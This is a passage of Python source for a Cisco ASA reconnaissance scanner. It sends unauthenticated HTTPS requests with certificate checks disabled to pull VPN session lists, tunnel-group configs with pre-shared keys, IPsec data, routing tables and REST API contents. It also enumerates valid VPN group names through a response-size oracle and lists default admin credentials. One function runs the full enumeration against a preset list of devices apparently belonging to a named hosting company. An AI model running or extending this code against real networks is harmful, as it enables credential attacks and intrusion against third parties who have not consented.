    sc1, body1, _ = _get('/admin/exec/show+vpn-sessiondb')
    if sc1 == 200 and len(body1) > 0 and (
        'Session Type' in body1
        or 'Username' in body1
        or 'Index' in body1
        or 'Protocol' in body1
        or 'IKEv' in body1
    ):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'VPN_SESSION_DB_UNAUTH',
            'detail': (
                f'ASA VPN session database at {base}/admin/exec/show+vpn-sessiondb '
                f'returned HTTP 200 ({len(body1)} bytes) without authentication. '
                f'Active VPN session enumeration discloses: authenticated usernames, '
                f'assigned IP addresses, tunnel-group membership, session duration, '
                f'bytes in/out per session, and IKE/IPsec/SSL protocol per peer. '
                f'Peer IP list enables targeted de-authentication attacks; username '
                f'list seeds credential attacks against AAA servers. '
                f'Body excerpt: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 2: Group policy dump via POST exec
    # Attempt to extract a session token from the admin login page
    _, _, admin_hdrs = _get('/admin/')
    session_token = None
    for hdr_name in ('X-Auth-Token', 'x-auth-token', 'X-Sid'):
        if hdr_name in admin_hdrs:
            session_token = admin_hdrs[hdr_name]
            break

    sc2, body2 = _post_exec('/admin/exec/show+group-policy', token=session_token)
    if sc2 == 200 and len(body2) > 0 and (
        'Group Policy' in body2
        or 'group-policy' in body2
        or 'vpn-tunnel-protocol' in body2
        or 'split-tunnel' in body2
        or 'banner' in body2.lower()
    ):
        findings.append({
            'severity': 'HIGH',
            'title': 'GROUP_POLICY_DUMP',
            'detail': (
                f'ASA group policy configuration at {base}/admin/exec/show+group-policy '
                f'returned HTTP 200 ({len(body2)} bytes) without authentication. '
                f'Group policy dump discloses: tunnel-protocol restrictions '
                f'(SSL/IKEv1/IKEv2/L2TP), split-tunnel ACL names and mode '
                f'(split-include/exclude/tunnelall), DNS server assignments, '
                f'idle/session timeout values, and banner text. '
                f'Split-tunnel ACL names enable targeted ACL enumeration; '
                f'DNS assignments map internal resolver infrastructure. '
                f'Body excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: IKE Phase 1 SA enumeration (show crypto isakmp sa)
    sc3, body3, _ = _get('/admin/exec/show+crypto+isakmp+sa')
    if sc3 == 200 and len(body3) > 0 and (
        'IKEv' in body3
        or 'isakmp' in body3.lower()
        or 'MM_ACTIVE' in body3
        or 'QM_IDLE' in body3
        or 'AM_ACTIVE' in body3
        or ('dst' in body3.lower() and 'src' in body3.lower() and 'state' in body3.lower())
    ):
        findings.append({
            'severity': 'HIGH',
            'title': 'ISAKMP_SA_EXPOSED',
            'detail': (
                f'IKE SA table at {base}/admin/exec/show+crypto+isakmp+sa '
                f'returned HTTP 200 ({len(body3)} bytes) without authentication. '
                f'Active IKE Security Associations disclose: remote peer IP addresses, '
                f'IKEv1/IKEv2 SA state (MM_ACTIVE/QM_IDLE/AM_ACTIVE), encryption '
                f'and integrity algorithm negotiated, D-H group, and SA lifetime remaining. '
                f'Peer IP list enables targeted IKE denial-of-service (delete SA injection, '
                f'aggressive-mode identity enumeration); algorithm disclosure scopes '
                f'downgrade attack feasibility. '
                f'Body excerpt: {body3[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 4: IPsec Phase 2 SA details (show crypto ipsec sa)
    sc4, body4, _ = _get('/admin/exec/show+crypto+ipsec+sa')
    if sc4 == 200 and len(body4) > 0 and (
        'IPsec' in body4
        or 'ipsec' in body4.lower()
        or 'local ident' in body4.lower()
        or 'remote ident' in body4.lower()
        or 'current_peer' in body4.lower()
        or ('spi' in body4.lower() and 'esp' in body4.lower())
    ):
        findings.append({
            'severity': 'HIGH',
            'title': 'IPSEC_SA_EXPOSED',
            'detail': (
                f'IPsec SA table at {base}/admin/exec/show+crypto+ipsec+sa '
                f'returned HTTP 200 ({len(body4)} bytes) without authentication. '
                f'Active IPsec Security Associations disclose: current peer IP, '
                f'local and remote traffic selectors (proxy identities — source/dest '
                f'subnet pairs protected by each SA), transform set in use '
                f'(ESP-AES/3DES + HMAC-SHA/MD5), SPI values, and inbound/outbound '
                f'packet counters. Traffic selector disclosure maps all protected subnets '
                f'reachable through each VPN peer; SPI values enable SA-targeted '
                f'replay attacks. '
                f'Body excerpt: {body4[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 5: Tunnel-group running configuration (show run tunnel-group)
    sc5, body5, _ = _get('/admin/exec/show+run+tunnel-group')
    if sc5 == 200 and len(body5) > 0 and (
        'tunnel-group' in body5.lower()
        or 'pre-shared-key' in body5.lower()
        or 'ipsec-attributes' in body5.lower()
        or 'general-attributes' in body5.lower()
        or 'webvpn-attributes' in body5.lower()
    ):
        findings.append({
            'severity': 'CRITICAL',
            'title': 'TUNNEL_GROUP_EXPOSED',
            'detail': (
                f'Tunnel-group running config at {base}/admin/exec/show+run+tunnel-group '
                f'returned HTTP 200 ({len(body5)} bytes) without authentication. '
                f'Full tunnel-group configuration discloses: connection profile names '
                f'(ipsec-l2l / remote-access type), preshared keys (pre-shared-key '
                f'entries in ipsec-attributes), default-group-policy assignments, '
                f'AAA server group bindings, and group-url values. '
                f'Preshared key exposure enables direct IPsec session impersonation; '
                f'group-url list enumerates all valid VPN connection profiles for '
                f'targeted credential attacks. '
                f'Body excerpt: {body5[:300]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_ssl_vpn_portal(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """SSL VPN / AnyConnect / WebVPN portal surface exposure.

    Probes the four canonical ASA clientless-SSL-VPN and AnyConnect endpoints
    defined in Cisco ASA All-in-One (3e) Chapters 22-23.  Each returning 200
    is a distinct attack surface: the logon page fingerprints the appliance,
    the session endpoint leaks state, the WebVPN index exposes the portal
    frame, and win.js discloses AnyConnect version strings embedded in JS
    (cscoVer / webvpnState markers).
    """
    findings = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f'https://{host}:{port}'

    def _get(path):
        req = urllib.request.Request(f'{base}{path}')
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(8192)
                return r.status, body
        except urllib.error.HTTPError as e:
            return e.code, b''
        except Exception:
            return None, b''

    # --- /+CSCOE+/logon.html ---
    sc1, body1 = _get('/+CSCOE+/logon.html')
    if sc1 == 200:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_SSL_VPN_PORTAL — AnyConnect/WebVPN portal exposed',
            'detail': (
                f'GET /+CSCOE+/logon.html returned HTTP 200 ({len(body1)} bytes). '
                f'The CSCOE (Cisco SSL VPN Client Operation Engine) logon page is '
                f'reachable without prior authentication.  Presence confirms SSL VPN '
                f'is enabled on this interface; the page fingerprints ASA software '
                f'version and exposes the group-alias selector used for tunnel-group '
                f'enumeration (Chapter 22 clientless design).  '
                f'Body excerpt: {body1[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # --- /+CSCOE+/session.html ---
    sc2, body2 = _get('/+CSCOE+/session.html')
    if sc2 == 200:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_VPN_SESSION_ENDPOINT',
            'detail': (
                f'GET /+CSCOE+/session.html returned HTTP 200 ({len(body2)} bytes) '
                f'without authentication.  This endpoint manages active SSL VPN '
                f'session state; unauthenticated access may expose session tokens, '
                f'tunnel-group assignments, or internal redirect targets that an '
                f'attacker can leverage for session fixation or group-policy bypass.  '
                f'Body excerpt: {body2[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # --- /+webvpn+/index.html ---
    sc3, body3 = _get('/+webvpn+/index.html')
    if sc3 == 200:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_WEBVPN_PORTAL',
            'detail': (
                f'GET /+webvpn+/index.html returned HTTP 200 ({len(body3)} bytes). '
                f'The WebVPN (SSL-VPN) portal index is reachable without a session '
                f'cookie.  WebVPN and clientless SSL VPN are synonymous in Cisco '
                f'documentation (Ch 22 note); this surface hosts bookmark groups, '
                f'plug-in listings, and file-share proxies reachable by an '
                f'unauthenticated or low-privilege client.  '
                f'Body excerpt: {body3[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # --- /+CSCOE+/win.js — AnyConnect JS bundle, version disclosure ---
    sc4, body4 = _get('/+CSCOE+/win.js')
    if sc4 == 200:
        detail_base = (
            f'GET /+CSCOE+/win.js returned HTTP 200 ({len(body4)} bytes). '
            f'The AnyConnect JavaScript bundle is served without authentication '
            f'and commonly contains version strings (cscoVer, webvpnState) that '
            f'fingerprint the exact ASA software release for CVE targeting.  '
        )
        version_info = ''
        body4_str = body4.decode('utf-8', errors='replace')
        # Extract cscoVer / webvpnState version markers
        m_ver = re.search(r'cscoVer\s*[=:]\s*["\']?([0-9][^\s"\'<,;]{0,30})', body4_str)
        m_state = re.search(r'webvpnState\s*[=:]\s*["\']?([^\s"\'<,;]{1,60})', body4_str)
        if m_ver:
            version_info += f'cscoVer={m_ver.group(1).strip()} (version disclosure). '
        if m_state:
            version_info += f'webvpnState={m_state.group(1).strip()} (version disclosure). '
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASA_ANYCONNECT_JS_EXPOSED — version disclosure in JS',
            'detail': detail_base + version_info + f'Body excerpt: {body4_str[:200]}',
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_vpn_group_policy(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """VPN group-policy and tunnel-group enumeration via clientless SSL VPN surface.

    Probes the ASA WebVPN / CSCOE endpoints used to enumerate tunnel-group
    names, default group policies, and clientless plug-in listings as described
    in Cisco ASA All-in-One (3e) Chapters 22-23.  Group enumeration enables
    targeted credential attacks against specific connection profiles and
    reveals default VPN group names that indicate a factory-default posture.
    """
    findings = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f'https://{host}:{port}'

    def _get(path):
        req = urllib.request.Request(f'{base}{path}')
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(8192)
                return r.status, body
        except urllib.error.HTTPError as e:
            return e.code, b''
        except Exception:
            return None, b''

    def _post(path, payload_bytes, extra_headers=None):
        hdrs = {'Content-Type': 'application/x-www-form-urlencoded'}
        if extra_headers:
            hdrs.update(extra_headers)
        req = urllib.request.Request(
            f'{base}{path}',
            data=payload_bytes,
            headers=hdrs,
            method='POST',
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read(8192)
                return r.status, body
        except urllib.error.HTTPError as e:
            body = b''
            try:
                body = e.read(4096)
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, b''

    # --- Probe 1: /+CSCOE+/session.html unauthenticated session info leak ---
    sc1, body1 = _get('/+CSCOE+/session.html')
    if sc1 == 200 and len(body1) > 0:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASA_VPN_SESSION_INFO_UNAUTH',
            'detail': (
                f'GET /+CSCOE+/session.html returned HTTP 200 ({len(body1)} bytes) '
                f'without a valid session cookie.  Session management data returned '
                f'pre-auth may expose session state tokens, tunnel-group assignments, '
                f'or redirect targets usable for session fixation or group-policy '
                f'bypass attacks against the clientless SSL VPN portal.  '
                f'Body excerpt: {body1[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # --- Probe 2: tunnel-group enumeration via group= POST parameter ---
    # Different responses per valid vs invalid group name confirm enumeration.
    # Canonical default groups from Ch 22/23: DefaultRAGroup, DefaultWEBVPNGroup,
    # plus common aliases used in enterprise deployments.
    common_groups = [
        'DefaultRAGroup', 'DefaultWEBVPNGroup', 'VPN', 'Users', 'Remote',
        'RA', 'AnyConnect', 'SSL', 'SSLVPN', 'Corp',
    ]
    baseline_sc, baseline_body = _post(
        '/+webvpn+/index.html',
        b'group=AAANONEXISTENTGROUP999',
    )
    if baseline_sc is not None:
        baseline_len = len(baseline_body)
        hits = []
        for grp in common_groups:
            payload = f'group={grp}'.encode()
            sc, body = _post('/+webvpn+/index.html', payload)
            if sc is not None and abs(len(body) - baseline_len) > 64:
                # Response size delta > 64 bytes signals a different server path
                # (valid group accepted vs rejected) — classic group-enum oracle.
                hits.append(grp)
        if hits:
            findings.append({
                'severity': 'HIGH',
                'title': 'ASA_VPN_GROUP_ENUM — tunnel group names discoverable',
                'detail': (
                    f'POST /+webvpn+/index.html with group= parameter returns '
                    f'measurably different response sizes for valid vs invalid tunnel '
                    f'group names.  Confirmed valid groups: {hits}.  '
                    f'Tunnel-group enumeration reveals all active connection profiles '
                    f'(remote-access / webvpn type), enabling targeted credential '
                    f'attacks against specific group policies and exposing '
                    f'group-alias values that bypass lockout on non-default profiles '
                    f'(Chapter 22 group-policy design).  '
                    f'Baseline response length: {baseline_len} bytes.'
                ),
                'host': host,
                'port': port,
            })

    # --- Probe 3: clientless VPN plug-in / binary listing ---
    sc3, body3 = _get('/CACHE/stc/1/binaries/')
    if sc3 == 200 and len(body3) > 0:
        findings.append({
            'severity': 'MEDIUM',
            'title': 'ASA_VPN_PLUGIN_LISTING',
            'detail': (
                f'GET /CACHE/stc/1/binaries/ returned HTTP 200 ({len(body3)} bytes). '
                f'The clientless VPN plugin cache is directory-listable without '
                f'authentication.  Plug-in binaries (RDP, VNC, SSH, Telnet Java '
                f'applets distributed via the STC — Secure Tunnel Client — cache) '
                f'are exposed; their filenames and version strings enable targeted '
                f'CVE matching against specific thin-client plug-in releases.  '
                f'Body excerpt: {body3[:200]}'
            ),
            'host': host,
            'port': port,
        })

    # --- Probe 4: default tunnel-group names in any retrieved body ---
    # DefaultRAGroup and DefaultWEBVPNGroup are factory defaults present when the
    # operator has not renamed connection profiles (Chapter 22/23 deployment guide).
    all_bodies = [body1, baseline_body, body3]
    combined = b' '.join(all_bodies).decode('utf-8', errors='replace').lower()
    default_groups_found = []
    for marker in ('defaultragroup', 'defaultwebvpngroup'):
        if marker in combined:
            default_groups_found.append(marker)
    if default_groups_found:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_DEFAULT_VPN_GROUPS — default group names confirmed',
            'detail': (
                f'Default tunnel-group identifiers found in unauthenticated HTTP '
                f'responses: {default_groups_found}.  DefaultRAGroup is the built-in '
                f'remote-access connection profile; DefaultWEBVPNGroup is the default '
                f'clientless SSL VPN connection profile.  Their presence indicates '
                f'the operator has not renamed or hardened the factory-default '
                f'connection profiles, which simplifies targeted credential attacks '
                f'and group-alias enumeration (Chapter 22 group-policy design).  '
                f'Matched in response bodies from: /+CSCOE+/session.html, '
                f'/+webvpn+/index.html, /CACHE/stc/1/binaries/.'
            ),
            'host': host,
            'port': port,
        })

    return findings


def enumerate_macstadium_asas():
    """Enumerate all known MacStadium ASA instances."""
    results = []
    for asa_cfg in MACSTADIUM_ASAS:
        enum = ASAEnumerator(asa_cfg['host'], name=asa_cfg['name'])
        # Pre-seed known groups
        enum.groups = asa_cfg.get('groups', [])
        result = enum.enumerate_all()
        result['cert_pin'] = asa_cfg.get('cert_pin')
        results.append(result)
        print(enum.report())
        print()
    return results


def probe_asa_security_contexts(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe ASA ASDM REST API for unauthenticated multi-context configuration exposure.

    Synthesized from: Chapter 14 — Virtualization (Cisco ASA All-in-One, 3e).
    In multiple-context mode the ASA partitions into system execution space, an admin
    context, and one or more user (customer) contexts — each with its own config,
    interfaces, security policies, and routing table.  The admin context provides
    network access for AAA/syslog and acts as the management plane; a system
    administrator with admin-context access can changeto any user context.
    Unauthenticated access to /api/contexts discloses context names, config-url
    paths (which may include TFTP/FTP/HTTPS credentials embedded in the URL per
    Example 14-9), interface allocation, and resource-class membership.  Context
    names are case-sensitive identifiers used by changeto — enumerating them
    enables targeted credential attacks and session-hijacking against individual
    virtual firewalls.

    ASDM REST endpoints probed (port 443, HTTPS, no cert validation):
      GET /api/contexts           — full context list (names, URLs, interfaces)
      GET /api/contexts/admin     — admin context configuration
      GET /admin/exec/show+context — CLI show context output (context names + URLs)
    """
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={'Accept': 'application/json, text/plain, */*'},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, ''

    # Probe 1: /api/contexts — full context list
    sc1, body1 = _get('/api/contexts')
    if sc1 == 200 and len(body1) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_SECURITY_CONTEXTS_UNAUTH — multi-context configuration exposed',
            'detail': (
                f'ASDM REST /api/contexts at {host}:{port} returned HTTP 200 '
                f'({len(body1)} bytes) without authentication.  Response discloses '
                f'all virtual firewall (security context) names, config-url paths '
                f'(may embed TFTP/FTP credentials per ch14 Example 14-9), allocated '
                f'interface identifiers, and resource-class membership.  In multi-'
                f'context mode a system admin can changeto any listed context — '
                f'context names here are the targeting identifiers for credential '
                f'attacks and session hijacking against individual virtual firewalls.  '
                f'Body excerpt: {body1[:400]}'
            ),
            'host': host,
            'port': port,
        })
        # Count contexts — look for repeated context-name keys or array items
        ctx_count = max(
            body1.lower().count('"name"'),
            body1.lower().count('"contextname"'),
            body1.count('{'),
        )
        if ctx_count > 1:
            findings.append({
                'severity': 'HIGH',
                'title': f'ASA_MULTI_CONTEXT_DETECTED — {ctx_count} security contexts enumerated',
                'detail': (
                    f'Response from /api/contexts contains approximately {ctx_count} '
                    f'context entries.  Each context is an independent virtual firewall '
                    f'with its own ACLs, NAT table, routing table, and AAA policy '
                    f'(ch14 Table 14-2).  Enumerated context names enable targeted '
                    f'group-alias and tunnel-group attacks against each virtual firewall '
                    f'independently.  License limit disclosure (ch14 Table 14-3 — '
                    f'up to 250 contexts on ASA 5585-X) scopes the platform.  '
                    f'Body excerpt: {body1[:300]}'
                ),
                'host': host,
                'port': port,
            })

    # Probe 2: /api/contexts/admin — admin context config
    sc2, body2 = _get('/api/contexts/admin')
    if sc2 == 200 and len(body2) > 0:
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_ADMIN_CONTEXT_UNAUTH — admin security context accessible',
            'detail': (
                f'ASDM REST /api/contexts/admin at {host}:{port} returned HTTP 200 '
                f'({len(body2)} bytes) without authentication.  The admin context is '
                f'the system management plane: it provides connectivity to AAA and '
                f'syslog servers, holds the management interface IP, and is the '
                f'context from which a system administrator switches into all other '
                f'user contexts (ch14 "Admin Context" section).  Admin-context '
                f'config-url must reside on local disk (disk0:/admin.cfg by default) '
                f'— path disclosure enables targeted file-retrieval via auxiliary '
                f'channels.  Syslog server IP and AAA server IP visible in config '
                f'enable network topology reconstruction.  '
                f'Body excerpt: {body2[:400]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: /admin/exec/show+context — CLI show context output
    sc3, body3 = _get('/admin/exec/show+context')
    if sc3 == 200 and len(body3) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_CONTEXT_LIST_EXPOSED — security context names and interfaces visible',
            'detail': (
                f'ASDM exec endpoint /admin/exec/show+context at {host}:{port} '
                f'returned HTTP 200 ({len(body3)} bytes) without authentication.  '
                f'Output mirrors CLI "show context" — lists context names (with * '
                f'marking the admin context), allocated interface identifiers, and '
                f'config-url storage paths (ch14 Example 14-12).  Context names are '
                f'case-sensitive and used directly in changeto commands — full '
                f'enumeration here removes the need for brute-force context discovery.  '
                f'Interface alias names (e.g. CubsOutside/CubsInside set via '
                f'allocate-interface invisible) may be disclosed even when the '
                f'operator intended to hide physical interface mapping (ch14 Step 3).  '
                f'Body excerpt: {body3[:400]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_transparent_mode(host: str, port: int = 443, timeout: float = 10.0) -> list:
    """Probe ASA ASDM REST API for unauthenticated transparent (L2) firewall config exposure.

    Synthesized from: Chapter 15 — Transparent Firewalls (Cisco ASA All-in-One, 3e).
    Transparent mode places the ASA inline as a Layer 2 bridge — no IP hop, invisible
    to traceroute, both inside and outside interfaces share the same L3 subnet.  The
    only routable address is the BVI (Bridge Virtual Interface) management IP.
    Unauthenticated access to transparent-mode config discloses: firewall mode
    (routed vs transparent), BVI IP and subnet, bridge-group membership, static ARP
    and L2F entries (MAC-to-host mapping — ch15 Example 14-11/14-12), and the full
    routing table used for management traffic.  Static L2F entries (mac-address-table
    static, ch15 Step 7) pin specific MAC addresses to interfaces — disclosure enables
    precise MAC spoofing without triggering ARP inspection.  In MMTF (multi-context
    transparent) mode, interface-to-context allocation is also disclosed, enabling
    context-targeted L2 attacks.

    ASDM REST endpoints probed (port 443, HTTPS, no cert validation):
      GET /api/firewall/transparentMode  — transparent mode config and BVI addressing
      GET /admin/exec/show+firewall      — CLI show firewall (routed vs transparent)
      GET /api/routing/routeTable        — routing table (management topology)
      GET /api/interfaces/physical       — physical interface config including BVI
    """
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _get(path):
        url = f'{base}{path}'
        req = urllib.request.Request(
            url,
            headers={'Accept': 'application/json, text/plain, */*'},
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                return r.status, body
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body
        except Exception:
            return None, ''

    # Probe 1: /api/firewall/transparentMode — transparent mode config
    sc1, body1 = _get('/api/firewall/transparentMode')
    if sc1 == 200 and len(body1) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_TRANSPARENT_MODE_EXPOSED — L2 firewall config accessible',
            'detail': (
                f'ASDM REST /api/firewall/transparentMode at {host}:{port} returned '
                f'HTTP 200 ({len(body1)} bytes) without authentication.  Response '
                f'discloses transparent firewall configuration: firewall mode flag, '
                f'BVI IP address and subnet mask (the sole management address in '
                f'transparent mode — ch15 Step 3), bridge-group membership, and '
                f'optionally static ARP entries.  BVI IP is the L3 identity of an '
                f'otherwise invisible L2 device; disclosure enables targeted management-'
                f'plane attacks (SSH brute-force, SNMP poll) against a host that '
                f'appears transparent to traceroute.  In MMTF, per-context BVI '
                f'addresses disclose the management IP for each virtual transparent '
                f'firewall (ch15 "MMTF Deployment" section).  '
                f'Body excerpt: {body1[:400]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 2: /admin/exec/show+firewall — CLI show firewall
    sc2, body2 = _get('/admin/exec/show+firewall')
    if sc2 == 200 and len(body2) > 0:
        mode_str = body2.strip()[:120]
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_FIREWALL_MODE_EXPOSED',
            'detail': (
                f'ASDM exec endpoint /admin/exec/show+firewall at {host}:{port} '
                f'returned HTTP 200 ({len(body2)} bytes) without authentication.  '
                f'Output mirrors CLI "show firewall" (ch15 Example 15-3): confirms '
                f'whether the device operates in routed or transparent mode.  '
                f'Routed mode confirmation removes transparent-mode bypass '
                f'considerations from attacker model; transparent mode confirmation '
                f'flags ARP spoofing, MAC flooding, VLAN hopping, and L2F table '
                f'poisoning as viable vectors since no L3 hop is present to enforce '
                f'routing boundaries.  EtherType ACL policy (ch15 Step 5) is not '
                f'visible here — a separate ACL probe is required.  '
                f'Mode disclosed: {mode_str!r}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 3: /api/routing/routeTable — routing table (management topology)
    sc3, body3 = _get('/api/routing/routeTable')
    if sc3 == 200 and len(body3) > 0:
        # Count route entries as a proxy for topology depth
        route_count = max(
            body3.lower().count('"network"'),
            body3.lower().count('"destination"'),
            body3.count('{'),
        )
        findings.append({
            'severity': 'CRITICAL',
            'title': 'ASA_ROUTE_TABLE_UNAUTH — internal routing topology disclosed',
            'detail': (
                f'ASDM REST /api/routing/routeTable at {host}:{port} returned '
                f'HTTP 200 ({len(body3)} bytes) without authentication.  '
                f'Response contains approximately {route_count} route entries.  '
                f'In transparent mode the routing table governs management-plane '
                f'traffic only (default gateway toward inside or management interface '
                f'— ch15 Step 4); disclosure maps the management network reachability '
                f'and the upstream/downstream router IP addresses.  Combined with '
                f'BVI IP from transparentMode probe, the complete management plane '
                f'topology is reconstructed: L3 network segments, next-hop gateways, '
                f'and egress interface names.  In routed mode this discloses the '
                f'full production RIB — sufficient for lateral movement path planning '
                f'and segmentation-bypass identification.  '
                f'Body excerpt: {body3[:400]}'
            ),
            'host': host,
            'port': port,
        })

    # Probe 4: /api/interfaces/physical — physical interface config including BVI
    sc4, body4 = _get('/api/interfaces/physical')
    if sc4 == 200 and len(body4) > 0:
        # Look for BVI addresses or bridge-group indicators
        body_lower = body4.lower()
        bvi_present = 'bvi' in body_lower or 'bridge' in body_lower or 'bridge-group' in body_lower
        iface_count = max(
            body4.lower().count('"name"'),
            body4.lower().count('"nameif"'),
            body4.count('{'),
        )
        bvi_note = (
            'BVI (Bridge Virtual Interface) entries detected — transparent mode confirmed.  '
            if bvi_present
            else ''
        )
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_PHYSICAL_INTERFACES_UNAUTH — interface topology exposed',
            'detail': (
                f'ASDM REST /api/interfaces/physical at {host}:{port} returned '
                f'HTTP 200 ({len(body4)} bytes) without authentication.  '
                f'Response contains approximately {iface_count} interface entries.  '
                f'{bvi_note}'
                f'Disclosed attributes include: interface names (nameif), security '
                f'levels, IP addresses, bridge-group membership, and shutdown state.  '
                f'In transparent mode, bridge-group assignment (ch15 Step 2: '
                f'bridge-group 1 on inside/outside) reveals which physical interfaces '
                f'are bridged together and which VLANs are in scope.  Security-level '
                f'values (0=outside, 100=inside, 50=DMZ) map the trust hierarchy '
                f'without requiring CLI access.  Interface aliases set via '
                f'allocate-interface invisible (ch14 Step 3) may appear here even '
                f'when the operator intended to hide physical interface identity.  '
                f'Body excerpt: {body4[:400]}'
            ),
            'host': host,
            'port': port,
        })

    return findings


def probe_asa_rest_api_exposure(host: str, port: int = 55443, timeout: float = 10.0) -> list:
    """Detect unauthenticated ASA REST API exposure on port 55443 (HTTPS).

    Synthesized from: Chapter 4 (System Access/ASDM), Chapter 5 (System Maintenance)
    — Cisco ASA All-in-One NGFW, 3rd Ed.

    The Cisco ASA REST API plugin (asa-restapi-*.zip) exposes a JSON management
    plane on port 55443 by default.  Unlike ASDM (port 443), the REST API uses
    token-based auth — but misconfigured or default-credential deployments allow
    unauthenticated reads.  The API mirrors the full ASDM feature set: monitoring,
    object management, VPN session enumeration, ACL retrieval, and local-user reads.

    Attack surface:
      /api/monitoring/serialno           — device serial number (identifier for targeted attacks)
      /api/monitoring/device/components  — hardware inventory (model, DRAM, flash)
      /api/objects/networkobjects        — network object definitions (IP subnets, hosts)
      /api/vpn/sessiondb/anyconnect      — live AnyConnect session table (usernames, IPs)
      /api/interfaces/physical           — interface config (IPs, security levels, names)
      /api/access/global/rules           — global ACL ruleset (full policy map)
      /api/objects/localusers            — local user database (usernames, privilege levels)
      Default creds: admin:cisco, admin:admin, admin: (blank)

    All probes use SSL with check_hostname=False, verify_mode=CERT_NONE.
    """
    findings = []

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    base = f'https://{host}:{port}'

    def _do_get(path, extra_headers=None):
        url = f'{base}{path}'
        hdrs = {'Accept': 'application/json, text/plain, */*'}
        if extra_headers:
            hdrs.update(extra_headers)
        req = urllib.request.Request(url, headers=hdrs)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                body = r.read().decode('utf-8', errors='replace')
                resp_hdrs = dict(r.headers)
                return r.status, body, resp_hdrs
        except urllib.error.HTTPError as e:
            body = ''
            try:
                body = e.read().decode('utf-8', errors='replace')
            except Exception:
                pass
            return e.code, body, dict(e.headers)
        except Exception:
            return None, '', {}

    # ── Probe 1: serial number disclosure ────────────────────────────────────
    sc1, body1, hdrs1 = _do_get('/api/monitoring/serialno')
    if sc1 == 200 and len(body1) > 0:
        serial = ''
        try:
            d = json.loads(body1)
            serial = d.get('serialNumber', d.get('serialno', d.get('value', '')))
        except Exception:
            m = re.search(r'[A-Z0-9]{11,14}', body1)
            if m:
                serial = m.group(0)
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_REST_SERIAL_EXPOSED — device serial number disclosed via unauthenticated REST API',
            'detail': (
                f'ASA REST API /api/monitoring/serialno at {host}:{port} returned '
                f'HTTP 200 ({len(body1)} bytes) without authentication.  '
                f'Serial number extracted: {serial!r}.  '
                f'The serial number is the primary identifier for Cisco Smart Licensing '
                f'registration (ch04: show version discloses serial + license key); '
                f'an attacker can use it to impersonate the device against CSSM, '
                f'clone license entitlements, or fingerprint the exact hardware SKU '
                f'for targeted firmware exploits.  REST API default port 55443; '
                f'unauthenticated read indicates missing "rest-api agent" auth config. '
                f'Body excerpt: {body1[:300]}'
            ),
            'host': host,
            'port': port,
        })

    # ── Probe 2: hardware inventory ───────────────────────────────────────────
    sc2, body2, _ = _do_get('/api/monitoring/device/components')
    if sc2 == 200 and len(body2) > 0:
        findings.append({
            'severity': 'HIGH',
            'title': 'ASA_REST_INVENTORY_UNAUTH — hardware inventory exposed via unauthenticated REST API',
            'detail': (
                f'ASA REST API /api/monitoring/device/components at {host}:{port} '
                f'returned HTTP 200 ({len(body2)} bytes) without authentication.  '
                f'Disclosed attributes include model number, DRAM, flash capacity, '
                f'and installed module inventory — sufficient to identify the exact '
                f'hardware platform and target platform-specific CVEs.  '
                f'ch04 show version equivalent; maps the device footprint for '
                f'supply-chain and firmware attack pre-targeting.  '
                f'Body excerpt: {body2[:300]}'
            ),
            'host': host,
            'port': port,
        })

